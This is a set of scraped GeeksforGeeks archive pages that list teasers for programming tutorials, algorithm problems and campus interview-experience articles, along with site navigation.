Java-Duration; Java-Exception Handling; Java-Exceptions; Java-Field; Java-File Class; Java-file-handling; Java-Functions; Java-guava; Java-HashMap; Java-hashset; Java-HashTable; Java-I/O; Java-inheritance; Java-Instant; Java-Integer; Java-interfaces; Java-intstream; Java-IO package; Java-JSP; Java-lang package; Java-lang-reflect-package; Java-Library; Java-LinkedBlockingDeque; Java-LinkedHashMap; Java-LinkedHashSet; Java-LinkedList; Java-LinkedTransferQueue; Java-list; Java-List-Programs; Java-LocalDate; Java-LocalDateTime; Java-Locale; Java-LocalTime; Java-Logger; Java-LogRecord; Java-longstream; Java-map; Java-Map-Programs; Java-Matcher; Java-math; Java-math-package; Java-Method Class; Java-MonthDay; Java-Multithreading; Java-net-package; Java-Networking; Java-NIO package; Java-NumberFormat; Java-Object Oriented; Java-OffsetDateTime; Java-OffsetTime; Java-Operators; Java-Output; Java-Path; Java-Period; Java-PrintStream; Java-PrintWriter; Java-priority-queue; Java-Properties; Java-reflection-array; Java-regular-expression; Java-security package; Java-set; Java-Set-Programs; Java-ShortBuffer; Java-SortedMap; Java-Spring; Java-Stack; Java-stream; Java-Stream interface; Java-Stream-programs; Java-StrictMath; Java-String-Programs; Java-StringBuffer; Java-StringBuilder; Java-Strings; Java-swing; Java-text package; Java-time package; Java-Time-Chrono package; Java-TreeMap; Java-treeset; Java-util-concurrent-atomic package; Java-Vector; Java-Year; Java-YearMonth; Java-ZonedDateTime; Java-ZoneOffset; Java.lang.Class; Java.lang.Package Class; Java.nio.file package; Java.time.format package; Java.time.temporal package; Java.util.logging package; JavaFX; JavaScript; JavaScript - Underscore.js; Javascript-array; Javascript-basics; Javascript-date; JavaScript-Errors; JavaScript-ES; Javascript-functions; JavaScript-Lodash; Javascript-math; JavaScript-Methods; JavaScript-Misc; Javascript-object; Javascript-operators; JavaScript-p5.js; JavaScript-Properties; JavaScript-RegExp; Javascript-string; Javascript-typedArray; JavaTuples; JDBC; JP Morgan; JQuery; JQuery-Basics; JQuery-Effects; JQuery-Events; JQuery-HTML/CSS; JQuery-Methods; JQuery-Misc; JQuery-Mobile; JQuery-Plugin; JQuery-Selectors; JQuery-Traversing; JS++; JSON; Julia; Kali-Linux; Knapsack; Kotlin; Kotlin Android; Laravel; Large-numbers; LCA; LCM; LCS; Lex program; Lexicographic-ordering; Limited-range-elements; Linked List; Linked Lists; Linked-List-Sorting; Linkedin; Linux; Linux-command; Linux-file-commands; Linux-misc-commands; Linux-networking-commands; Linux-Shell-Commands; Linux-system-commands; Linux-text-processing-commands; Linux-Unix; LIS; Loops & Control Structure; Machine Learning; MakeMyTrip; MAQ Software; Marketing; Materialize-CSS; Math; Mathematical; Maths; Maths-cube; Maths-log; Maths-perfect-square; Maths-power; MATLAB; Matplotlib Artist-class; Matplotlib axes-class; Matplotlib figure-class; Matplotlib Pyplot-class; Matplotlib-Axis Class; Matrix; MCQ; Median-finding; Memoization; Memory-management; Merge Sort; Microprocessor; Microsoft; Misc; Modular Arithmetic; Moment.js; MongoDB; MongoDB-operators; Mongoose; Morgan Stanley; MST; Myntra; Mysql; N-ary-tree; Nagarro; Natural Numbers; Natural-language-processing; NCERT; NCERT Solutions Class-8; NCERT Solutions Class-9; Network-security; Neural Network; Node-Jimp; Node-URL; Node.js; Node.js-Basics; Node.js-Buffer-module; Node.js-crypto-module; Node.js-dns-module; Node.js-fs-module; Node.js-GM; Node.js-Methods; Node.js-Misc; Node.js-os-module; Node.js-process-module; Node.js-Stream-module; Node.js-util-module; Node.js-Zlib-module; NodeJS-function; NP Complete; NPHard; Number Divisibility; Number-digits; Number-theory; Numbers; Off-Campus; Ola Cabs; On-Campus; OpenCV; Operating Systems; Operating Systems-CPU Scheduling; Operating Systems-Memory Management; Operators; Oracle; Order-Statistics; OYO Rooms; Palindrome; Pandas periodIndex; Pandas scalar-period; Pandas-dataframe-program; Parentheses-Problems; Pattern Searching; Pattern-printing; PayPal; Paytm; Payu; Percentages; Perl; Perl-basics; Perl-function; Perl-Math-Functions; Perl-method; Perl-operators; Permutation; Permutation and Combination; Persistent Systems; Philips; PHP; PHP Programs; PHP- Reflection; PHP- ReflectionClass; PHP-array; PHP-ArrayObject; PHP-basics; PHP-date-time; PHP-DOM; PHP-DS\Collection; PHP-ds_deque; PHP-ds_map; PHP-ds_set; PHP-ds_vector; PHP-file-handling; PHP-function; PHP-Gmagick; PHP-gmp; PHP-Imagick; PHP-Intl; PHP-Iterators; PHP-math; PHP-Misc; PHP-OOP; PHP-PHPUnit; PHP-SplFileInfo; PHP-string; PHP-XML; Picked; Placement preparation; Pointers; PostgreSQL; PostgreSQL-dataTypes; PostgreSQL-function; PostgreSQL-managing-table; PostOrder Traversal; Prefix; Prefix-sum; Preorder Traversal; Prime Number; Prime-factor; Priority-queue; Probability; Process Synchronization; Processes & Threads; ProGeek; ProGeek 2.0; Program Output; Programming Language; Programming-puzzle; Project; Puzzles; Pyhton numpy-arrayCreation; PyQt-exercise; Python; Python Bokeh-plotting-figure-class; Python Calander-module; Python Cmath-library; Python Decorators; Python dictionary-programs; Python Django; Python IMDbPY-module; Python List-of-Tuples; Python list-programs; Python math-library; Python math-library-functions; Python numpy-arrayManipulation; Python numpy-Logic Functions; Python Numpy-Masked Array; Python numpy-Mathematical Function; Python numpy-Matrix Function; Python numpy-ndarray; Python numpy-polynomials; Python numpy-program; Python numpy-Random; Python numpy-Statistics Functions; Python numpy-String Operation; Python OS-path-module; Python pandas-dataFrame; Python pandas-dataFrame-methods; Python pandas-datetime; Python pandas-datetimeIndex; Python Pandas-exercise; Python pandas-indexing; Python pandas-panel; Python pandas-panel-methods; Python pandas-series; Python pandas-series-datetime; Python pandas-series-methods; Python pandas-TimedeltaIndex; Python Pandas-Timestamp; Python Programs; Python PyQt-QCalendarWidget; Python PyQt-QColorDialog; Python PyQt-QCommandLinkButton; Python PyQt-QDateEdit; Python PyQt-QDateTimeEdit; Python PyQt-QDockWidget; Python PyQt-QDoubleSpinBox; Python PyQt-QListWidget; Python PyQt-QScrollBar; Python PyQt-SpinBox; Python PyQt-SpinBox-stylesheet; Python PyQt5-ComboBox; Python PyQt5-ComboBox-stylesheet; Python PyQt5-Label; Python scipy-stats-functions; Python string-programs; Python SymPy-Geometry; Python SymPy-Stats; Python Tensorflow-math-functions; Python tuple-programs; Python vlc-library; Python wxPython-Button; Python wxPython-RadioBox; Python wxPython-TreeCtrl; Python-basics; Python-Bokeh; Python-Built-in-functions; Python-ctype; Python-design-pattern; Python-dict; Python-excel; Python-exceptions; Python-file-handling; Python-Functions; Python-gui; Python-itertools; Python-json; Python-kivy; Python-Library; Python-list; Python-list-functions; Python-list-of-lists; Python-Mahotas; Python-matplotlib; Python-Miscellaneous; Python-modules; Python-mongoDB; Python-MoviePy; Python-mySQL; Python-nested-dictionary; Python-nltk; Python-numpy; Python-OOP; Python-oop-concepts; Python-OpenCV; Python-Operators; Python-os-module; Python-Output; Python-Pafy; Python-pandas; Python-pandas-series-str; Python-pgmagick; Python-pil; Python-Plotly; Python-PRAW; Python-projects; Python-PyCairo; Python-PyGame; Python-Pyglet; Python-PyQt; Python-PyQtGraph; Python-PyTorch; Python-random; Python-regex; Python-requests; Python-scipy; Python-Seaborn; Python-selenium; Python-set; Python-sort; Python-string; Python-Tensorflow; Python-tkinter; Python-tuple; Python-turtle; Python-Tweepy; Python-utility; Python-wand; Python-wxPython; QA - Placement Quizzes; Qualcomm; Queue; Quick Sort; R Data-science; R DataFrame-Function; R Language; R List-Function; R Machine-Learning; R Math-Function; R Matrix-Function; R Object-Function; R Statistics-Function; R String-Functions; R Vector-Function; R-Functions; R-plots; R-Statistics; Randomized; RD Sharma Class-10; RD Sharma Class-8; RD Sharma Class-9; RD Sharma Solutions; React-js; Recruitment Process; Recursion; Regular-expression; Reverse; Rotation; Ruby; Ruby Array-class; Ruby BigDecimal-class; Ruby Collections; Ruby Date-class; Ruby DateTime-class; Ruby Enumerable-class; Ruby Float-class; Ruby Hash-class; Ruby Integer-class; Ruby Math-class; Ruby Matrix-class; Ruby Numeric-class; Ruby Rational-class; Ruby Set-class; Ruby String Scanner-class; Ruby String-class; Ruby Symbol-class; Ruby Time-class; Ruby Vector-class; Ruby-Basics; Ruby-Methods; Salesforce; Samsung; SAP Labs; Sapient; SASS; Scala; Scala Immutable-BitSet; Scala Immutable-collection; Scala immutable-TreeSet; Scala Mutable-collections; Scala Mutable-SortedMap; Scala mutable-sortedset; Scala-Basics; Scala-byte; Scala-collection; Scala-Data Type; Scala-list; Scala-Map; Scala-Method; Scala-OOPS; Scala-Set; Scala-Strings; School Learning; School Mathematics; School Programming; School-programming; Script.aculo.us; Searching; Secure-coding; Segment-Tree; Selenium; Self-Balancing-BST; Semantic-UI; SEO; Series; Series-sum; Service Now; SetBitCount; Shortest Path; Sieve; Sliding-window; Snapdeal; Software Engineering; Software Testing; Solidity; Sorting; Sorting Quiz; Sprinklr; SQL; SQL-basics; SQL-Clauses-Operators; SQL-PL/SQL; SQL-Server; SQLmysql; Square-rectangle; Stack; Static Keyword; Statistical-algorithms; STL; Storage Classes and Type Qualifiers; Strings; Strings; Subarray; Subarray-sum; Subsequence; Subset; Substring; Suffix-Array; Swap-Program; SymPy; Synopsys; System-programming; Tableau; TCS; TCS-coding-questions; TCS-interview-experience; Technical Scripter; Technical Scripter 2018; Technical Scripter 2019; Technical Scripter 2020; TechTips; Tensorflow; Theory of Computation & Automata; Time Speed Distance; Topological Sorting; Traversal; Tree; Tree Traversals; Tree-level-order; Tree-traversal; Trees; Triangle; Trie; Two-pointer-algorithm; TypeScript; UGC NET CS 2016 July – III; UGC-NET; UGC-NET-UGC NET CS 2016 July – III; Union-find; United Health Group; Virtualization; Visa; VMWare; Vowel-consonant; Vue.JS; Walmart; Web technologies; Web-API; Web-Programs; Web-scraping; Wipro; Wipro Mock Test; Wipro-interview-experience; Write From Home; Yahoo; Zoho; Difficulty Level Basic Easy Medium Hard Expert Need of Package Managers in Developer’s Life 3 Ever Since Mankind started to program things, they started distributing them to various firms, individuals, etc. One had to install software on its own using… Read More » GBlogTechnical Scripter Technical Scripter 2020 100 Days of Code – A Complete Guide For Beginners and Experienced 3.3 Do you want to become a successful software developer and dreaming about getting into the big tech companies? Are you someone who is already working… Read More » GBlog ToDo App in C Language 3 ToDo List App is a kind of app that generally used to maintain our day-to-day tasks or list everything that we have to do, with… Read More » CC ProgramsC++ProjectTechnical Scripter Technical Scripter 2020 Amazon Interview Experience for SDE-Intern | On-Campus 2021 3 I am a final year BTech student at USICT, GGSIPU. Amazon visited our university for the role of SDE Intern (6 months). ROUND 1 (Online… Read More » InternshipInterview Experiences AmazonMarketingOn-Campus XOR Linked List – Find Nth Node from the end 3 Given a XOR linked list and an integer N, the task is to print the Nth node from the end of the given XOR linked… Read More » Bit MagicData StructuresLinked List Bitwise-XOR XOR Linked List – Find the middle node 3 Given an XOR linked list, the task is to find the middle node of the given XOR linked list. Examples: Input: 4 –> 7 –>… Read More » Bit MagicData StructuresLinked List Bitwise-XOR How to check file size in Python? 3 Prerequisites: os pathlib Given a file, the task here is to generate a Python Script to print its size. This article explains 2 methods to… Read More » Python PickedPython file-handling-programspython-file-handling Make all the elements of array odd by incrementing odd-indexed elements of odd-length subarrays 3 Given an array arr[] of size N, the task is to make all the array elements odd by choosing an odd length subarray of arr[]… Read More » ArraysMathematicalSearchingTechnical Scripter subarray Maximize count of distinct strings generated by replacing similar adjacent digits having sum K with K 3 Given a numeric string S of length N and a digit K, the task is to find the maximum number of distinct strings having a… Read More » MathematicalStringsTechnical Scripter number-digitsNumbersTechnical Scripter 2020 Schlumberger Interview Experience for Summer Internship 3 Schlumberger an oil – field, and drilling company visited our campus for Summer Internship in December – 2020 for 3rd Year B.Tech students for different… Read More » InternshipInterview Experiences MarketingOn-CampusSchlumberger Minimize a string by removing all occurrences of another string 3 Given two strings S1 and S2 of length N and M respectively, consisting of lowercase letters, the task is to find the minimum length to… Read More » StackStrings cpp-stack-functionssubstring Check if a Binary String can be converted to another by reversing substrings consisting of even number of 1s 3 Given two binary strings A and B of length N, the task is to check if the string A can be converted to B by… Read More » SearchingStrings binary-stringfrequency-countingsubstring How to delete file from the firebase using file url in node.js ? 3 To delete a file from the firebase storage we need a reference to store the file in storage. As we only have the file URL… Read More » Node.jsWeb Technologies Node.js-MiscPicked How to put the y-axis in logarithmic scale with Matplotlib ? 3 Axes’ in all plots using Matplotlib are linear by default, yscale() method of the matplotlib.pyplot library can be used to change the y-axis scale to… Read More » Python PickedPython-matplotlib Paytm Interview Experience for Software Engineer (6 Months Internship + FTE) 3 Round 1 (Online Coding): The first round was held at Cocubes platform and 3 coding questions were given to us to solve in a duration… Read More » InternshipInterview Experiences MarketingPaytm Maximum number of times a given string needs to be concatenated to form a substring of another string 3 Given two strings S1 and S2 of length N and M respectively, the task is to find the maximum value of times the string S2… Read More » GreedyPattern SearchingStrings substring How to Get All the Values of the LinkedHashMap in Java? 3.6 LinkedHashMap is a predefined class in Java that is similar to HashMap, contains key and its respective value, unlike HashMap. In LinkedHashMap insertion order is… Read More » JavaJava ProgramsTechnical Scripter Java-LinkedHashMapPickedTechnical Scripter 2020 How to Get a Value From LinkedHashMap by Index in Java? 3.6 LinkedHashMap is a predefined class in Java which is similar to HashMap, contain key and its respective value unlike HashMap, In LinkedHashMap insertion order is… Read More » JavaJava ProgramsTechnical Scripter Java-LinkedHashMapPicked Java Program to Add Tables to a Word Document 3 OpenCV (Open Source Computer Vision Library) is an open-source computer vision and machine learning software library. The library has more than 2500 optimized algorithms, which… Read More » JavaJava ProgramsTechnical Scripter PickedTechnical Scripter 2020 Jetpack Architecture Components in Android 3 Android Jetpack is a set of software components, libraries, tools, and guidance to help in developing robust Android applications. Launched by Google in 2018, Jetpack… Read More » AndroidTechnical Scripter androidTechnical Scripter 2020 « Prev12345678910111213...350351Next » Most popular in Android How to Change the Background Color of Button in Android using ColorStateList?Image Slider in Android using ViewPagerContent Providers in Android with ExampleHow to Push Notification in Android using Firebase Cloud Messaging?Bottom Navigation Bar in Android More related articles in Android Services in Android with ExampleHow to Create a Splash Screen in Android using Kotlin?How to Create an Animated Splash Screen in Android?ArrayAdapter in Android with ExampleMVC (Model View Controller) Architecture Pattern in Android with Example room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Articles Archives - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...What is Memory Leak? How can we avoid?Tree Traversals (Inorder, Preorder and Postorder)Must Do Coding Questions Company-wisePractice for cracking any coding interviewCommonly Asked Data Structure Interview Questions | Set 1Analysis of Algorithms | Set 1 (Asymptotic Analysis)SQL | Join (Inner, Left, Right and Full Joins)Analysis of Algorithms | Set 2 (Worst, Average and Best Cases)Analysis of Algorithms | Set 3 (Asymptotic Notations)Mutex vs SemaphoreUnderstanding "extern" keyword in CHow to write a Pseudo Code?find command in Linux with examplesAnalysis of Algorithms | Set 4 (Analysis of Loops)OOPs | Object Oriented DesignSQL | GROUP BYData Structures and Algorithms Online Courses : Free and PaidRecursive Practice Problems with SolutionsSQL Interview QuestionsStorage for Strings in CSQL | ORDER BYSQL | ViewsNP-Completeness | Set 1 (Introduction)Little and Big Endian MysteryHow Content Writing at GeeksforGeeks works?Recursive FunctionsWhat is Memory Leak? How can we avoid?SQL | INSERT INTO StatementDo not use sizeof for array parameters Category Archives: Articles Structure of C++ Program Last Updated: 15-12-2020 The C++ program is written using a specific template structure. The structure of the program written in C++ language is as follows: Documentation Section: This… Read More » ArticlesC++C++ Programs While loop with Compile time constants Last Updated: 14-12-2020 While loop is a control flow statement that allows code to be executed repeatedly based on a given Boolean condition. The while loop can be… Read More » ArticlesJavaLoops & Control Structure Projected clustering in data analytics Last Updated: 09-12-2020 In this article, we are going to discuss about projected clustering in data analytics. Projected Clustering : Projected clustering is the first, top-down partitioning projected… Read More » ArticlesDBMS Flutter – BoxDecoration Widget Last Updated: 03-12-2020 BoxDecoration is a build-in widget in flutter API. At a bare basic level, it describes how a box should be painted on the screen. The… Read More » AndroidArticlesDartFlutterandroidFlutterFlutter-widgets Higher Order Functions in C++ Last Updated: 01-12-2020 Higher-order functions are functions that take functions as an argument. It is used in functional languages which is not used in C++ are, although this… Read More » ArticlesC++C++ ProgramsFunctionsSTL Calculate pressure of a real gas using Van der Waal’s Equation Last Updated: 04-12-2020 2 Given integers V, T, and n representing the volume, temperature and the number of moles of a real gas, the task is to calculate the… Read More » Articles 3-way comparison operator (Space Ship Operator) in C++ 20 Last Updated: 24-11-2020 5 The three-way comparison operator “<=>” is called a spaceship operator. The spaceship operator determines for two objects A and B whether A < B, A… Read More » ArticlesC++C++ Programscpp-operator Examples of Big-O analysis Last Updated: 24-11-2020 Prerequisite: Analysis of Algorithms | Big-O analysis In the previous article, the analysis of the algorithm using Big O asymptotic notation is discussed. In this… Read More » AnalysisArticlesAlgorithms-Analysis of Algorithms (Recurrences)Analysis of Algorithmstime complexity Correcting EOF error in python in Codechef Last Updated: 24-11-2020 EOF stands for End Of File. Well, technically it is not an error, rather an exception. This exception is raised when one of the built-in… Read More » ArticlesProgramming LanguagePythonpythonPython-exceptions Future of Cybersecurity Last Updated: 25-11-2020 The past few years have been filled with shocks for the IT industry. The wave of global ransomware attacks that struck from 2017 to 2019… Read More » ArticlesGBlogTechTipsCyber-securityNetwork-security Flutter – BoxShadow Widget Last Updated: 23-11-2020 5 BoxShadow is a built-in widget in flutter, whose functionality is to cast shadow to a box. The BoxShadow widget is usually used with BoxDecoration. In… Read More » AndroidArticlesDartFlutter Relational Database from CSV Files in C Last Updated: 17-11-2020 4 In C programming, using arrays and string for data storage at run time which is volatile and gets memory in RAM. But to store data… Read More » ArticlesCC ProgramsC-File HandlingCSVFile Handling Difference between std::set and std::list Last Updated: 17-11-2020 1 Set: Set is a type of associative container which stores elements in a sorted manner. All the elements of a set are unique and can… Read More » ArticlesDifference Betweencpp-listcpp-setHashSetLinked Lists Data Conversion in C++ Last Updated: 18-11-2020 1 A user-defined data types are designed by the user to suit their requirements, the compiler does not support automatic type conversions for such data types… Read More » ArticlesC++C++ ProgramsC-Data Typescpp-data-types Flutter – Border Widget Last Updated: 19-11-2020 Border widget in flutter is assigned a simple functionality to add borders to the other widgets. The first is by creating all borders using BorderSide.… Read More » AndroidArticlesDartFlutterFlutter-widgets Page 1 of 2512345...1020...»Last » Most popular in Articles Proof that SAT is NP CompleteGeneration of Programming LanguagesRunning Python script on GPU.getch() function in C with ExamplesStructure Member Alignment, Padding and Data Packing Most Visited in Articles SQL | DROP, TRUNCATEExtends vs Implements in JavaAccess Control Lists(ACL) in LinuxSQL | Join (Cartesian Join & Self Join)SQL | UPDATE Statement room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

interview-preparation Archives - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...Must Do Coding Questions Company-wisePractice for cracking any coding interviewTop 10 algorithms in Interview QuestionsCommonly Asked Data Structure Interview Questions | Set 1A Step by Step Guide for Placement Preparation | Set 1Top 20 Dynamic Programming Interview QuestionsCommonly Asked C Programming Interview Questions | Set 1Commonly Asked OOP Interview Questions | Set 1Commonly Asked C++ Interview Questions | Set 1Top 20 Linked List Interview QuestionData Structures and Algorithms Online Courses : Free and PaidCommonly Asked Java Programming Interview Questions | Set 2Must Do Questions for Companies like TCS, CTS, HCL, IBM …TCS Placement Paper | MCQ 1Commonly Asked C Programming Interview Questions | Set 2Commonly Asked Algorithm Interview Questions | Set 1Interview Questions for Java ProfessionalsPlacement Preparation GuideHow can one become good at Data structures and Algorithms easily?Top 20 Hashing Technique based Interview QuestionsTop 10 Interview Questions on Depth First Search (DFS)Placement 100 : Complete Interview Preparation package you must have this Placement SeasonHow to Prepare for Amazon Software Development Engineering Interview?Commonly Asked C++ Interview Questions | Set 2Cognizant Placement Paper | Aptitude Set 1TCS Interview QuestionsTop 20 Greedy Algorithms Interview QuestionsHow to prepare for Google Kickstart - a CodeJam competition?Top 20 Backtracking Algorithm Interview Questions Tag Archives: interview-preparation Print path from a node to root of given Complete Binary Tree Last Updated: 20-12-2020 Given an integer N, the task is to find the path from the Nth node to the root of a Binary Tree of the following… Read More » GreedyMathematicalTreeDFSinterview-preparationNumbers Smallest positive integer that divides all array elements to generate quotients with sum not exceeding K Last Updated: 21-12-2020 Given an array arr[] of size N and a positive integer K, the task is to find the smallest positive integer such that the sum… Read More » ArraysMathematicalPlacementsSearchingBinary Searchinterview-preparation Longest Substring of 1’s after removing one character Last Updated: 15-12-2020 3 Given a binary string S of length N, the task is to find the longest substring consisting of ‘1’s only present in the string after… Read More » Competitive ProgrammingSearchingStringsTechnical Scripterinterview-preparationsliding-windowsubstringTechnical Scripter 2020 Split squares of first N natural numbers into two sets with minimum absolute difference of their sums Last Updated: 07-12-2020 Given an integer N, the task is to partition the squares of first N( always a multiple of 8 ) natural numbers into two sets… Read More » CombinatorialMathematicalRecursioninterview-preparationmaths-perfect-squareNatural NumbersNCR Corporationnumber-theory Minimum number of rabbits that must be present in the forest Last Updated: 07-12-2020 3 There are some colored rabbits in a forest. Given an array arr[] of size N, such that arr[i] denotes the number of rabbits having same… Read More » ArraysHashAmazonGoogleinterview-preparation Count ways to make sum of odd and even indexed elements equal by removing an array element Last Updated: 09-12-2020 Given an array, arr[] of size N, the task is to find the count of array indices such that removing an element from these indices… Read More » ArraysGreedyMathematicalDunzointerview-preparation Longest subsequence having maximum sum Last Updated: 07-12-2020 3 Given an array arr[] of size N, the task is to find the longest non-empty subsequence from the given array whose sum is maximum. Examples:… Read More » ArraysGreedyMathematicalSearchinginterview-preparationsubsequence Print all strings from given array that can be typed using keys from a single row of a QWERTY keyboard Last Updated: 14-12-2020 Given an array of strings arr[], consisting of strings made up of lowercase and uppercase letters, the task is to print all the strings from… Read More » ArraysHashSearchingStringscpp-stringscpp-unordered_mapinterview-preparation Super ASCII String Checker | TCS CodeVita Last Updated: 15-12-2020 5 In the Byteland country, a string S is said to super ASCII string if and only if the count of each character in the string… Read More » Stringsinterview-preparationTCSTCS-coding-questionsTCS-interview-experience Probability of collision between two trucks Last Updated: 02-12-2020 3.8 Given two strings S and T, where S represents the first lane in which vehicles move from left to right and T represents the second… Read More » MathematicalStringsAmazoninterview-preparationProbability Generate Bitonic Sequence of length N from integers in a given range Last Updated: 04-12-2020 3 Given integers N, L and R, the task is to generate a Bitonic Sequence of length N from the integers in the range [L, R]… Read More » ArraysGreedyMathematicalAmazonbitonicdequeinterview-preparation TCS Codevita | Holes And Balls Last Updated: 17-11-2020 Given two arrays of H[] and B[] consisting of N and M integers respectively, denoting the diameter of holes and balls respectively. M number of… Read More » ArraysGame TheorySortinginterview-preparationTCSTCS-coding-questionsTCS-interview-experience Smallest string which not a subsequence of the given string Last Updated: 01-12-2020 Given a string str, consisting of lowercase alphabets, the task is to find the shortest string which is not a subsequence of the given string.… Read More » GreedySortingStringscpp-unordered_setFacebookinterview-preparationprefixsubsequence Maximum K-digit number possible from subsequences of two given arrays Last Updated: 16-11-2020 4 Given two arrays arr1[] and arr2[] of length M and N consisting of digits [0, 9] representing two numbers and an integer K(K ≤ M… Read More » ArraysDynamic ProgrammingMathematicalRecursionGoogleinterview-preparationnumber-digitssubsequence Minimum number of Appends of X or Y characters from the end to the front required to obtain given string Last Updated: 16-11-2020 Given a string S and two positive integers X and Y, the task is to find the minimum number of operations required to obtain the… Read More » Pattern SearchingStringsinterview-preparationNagarro Page 1 of 1412345...10...»Last » Most popular in interview-preparation Top 40 Python Interview Questions & AnswersEnglish Reading Comprehension | Set 1How to Prepare for HR InterviewsjQuery Interview Questions and AnswersTCS Placement Paper | MCQ 10 Most visited in interview-preparation Commonly asked JavaScript Interview Questions | Set 1Advanced SQL Interview QuestionsHow to prepare for eLitmus Hiring Potential Test (pH Test)Commonly Asked C Programming Interview Questions | Set 3Minimum number of Appends of X or Y characters from the end to the front required to obtain given string room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

